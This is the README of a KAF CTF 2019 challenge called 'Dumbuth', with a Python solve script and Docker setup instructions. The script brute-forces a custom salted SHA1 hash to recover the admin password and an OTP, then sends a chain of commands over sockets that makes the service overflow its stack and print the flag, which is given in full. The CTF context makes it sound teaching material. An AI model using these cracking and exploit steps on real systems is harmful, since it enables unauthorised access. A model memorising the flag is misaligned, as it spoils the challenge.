# Dumbuth

Dumbuth is an information security challenge in the Miscellaneous category, and was presented to participants of [KAF CTF 2019](https://ctf.kipodafterfree.com)

## Challenge story

Mainframe management can be really hard at times :(

## Challenge exploit

A stackoverflow exception is catched when the user runs the find command, and the flag is displayed.

## Challenge solution

```py
import os.path
import hashlib
import requests
import socket
import json
import time
import re

CHARS = "abcdefghijklmnopqrstuvwxyz"
HOST = "localhost"
PORT_A = 1110
PORT_B = 1111

def recursive(hash, salt, target, current = ""):
	if len(current) < target:
		for c in CHARS:
			result = recursive(hash, salt, target, current+c)
			if result != None:
				return result
	else:
		if hash == duth_hash(current, salt):
			return current
		return None
	return None

def duth_hash(secret, salt, rounds = 10):
	# secret=secret.encode('utf-8')
	# salt=salt.encode('utf-8')
	if rounds == 0:
		return hashlib.sha1((secret+salt).encode('utf-8')).hexdigest()
	return hashlib.sha1((salt+duth_hash(secret, salt, rounds-1)).encode('utf-8')).hexdigest()

def ps(string):
	print("\33[1;31mOut\33[0m->"+string)
	return bytes(string+"\n", encoding='utf8')

def pr(sock):
	string = re.sub(r"(\n.+duth.+:.+>)+","",sock.recv(2048).decode('utf-8'))
	string=string[:-1]
	print("\33[1;33mIn\33[0m<-"+string.replace("\n","\n\33[1;33mIn\33[0m<-"))
	return string;

def slp():
	time.sleep(0.1)

def solve():
	if os.path.exists("password.txt"):
		password = open("password.txt", "r").read().replace("\n","")
	else:
		gethash = requests.post("http://"+HOST+":"+PORT_A+"/files/dumbuth/dumbuth.php", data={'mainframe':json.dumps({'action':'checkname','parameters':{'name':'admin'}})})
		resultA = json.loads(gethash.text)
		listA = resultA['mainframe']['result']['checkname']
		password = recursive(listA[1], listA[2], 6)
		file = open("password.txt", "w+")
		file.write(password)
		file.close()
	print("Main credentials: admin("+password+")")
	# Init shellA and shellB
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as A:
		A.connect((HOST, PORT_B))
		slp()
		A.recv(1024);
		A.sendall(ps("auth admin "+password))
		slp()
		if "OK" in pr(A):
			A.sendall(ps("elevate"))
			for i in range(8):
				slp()
			pr(A)
			A.sendall(ps("cmfs"))
			slp()
			pr(A)
			A.sendall(ps("ln /files /files/files"))
			slp()
			pr(A)
			A.sendall(ps("id"))
			slp()
			qsid = pr(A)
			A.sendall(ps("sotp"))
			slp()
			sotp = pr(A).split(" - ")
			otp = recursive(sotp[1], sotp[2], 5)
			print("OTP: "+otp)
			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as B:
				B.connect((HOST, PORT_B))
				pr(B)
				B.sendall(ps("auth admin "+password))
				slp()
				pr(B)
				B.sendall(ps("nc "+qsid+" "+otp+" find"))
				slp()
				data = pr(A)
				while not "╝" in data:
					data += pr(A)
		else:
			print("Initial Auth Failure")

solve();
```

## Building and installing

[Clone](https://github.com/NadavTasher/2019-Dumbuth/archive/master.zip) the repository, then type the following command to build the container:
```bash
docker build . -t dumbuth
```

To run the challenge, execute the following command:
```bash
docker run --rm -d -p 1110:80 -p 1111:8000 Dumbuth
```

## Usage

You may now access the challenge interface through your browser: `http://localhost:1110` and through `nc localhost 1111`

## Flag

Flag is:
```flagscript
KAF{d1dnt_expect_1t_t0_b3_4n_0verfl0w_3xc3ption}
```

## License
[MIT License](https://choosealicense.com/licenses/mit/)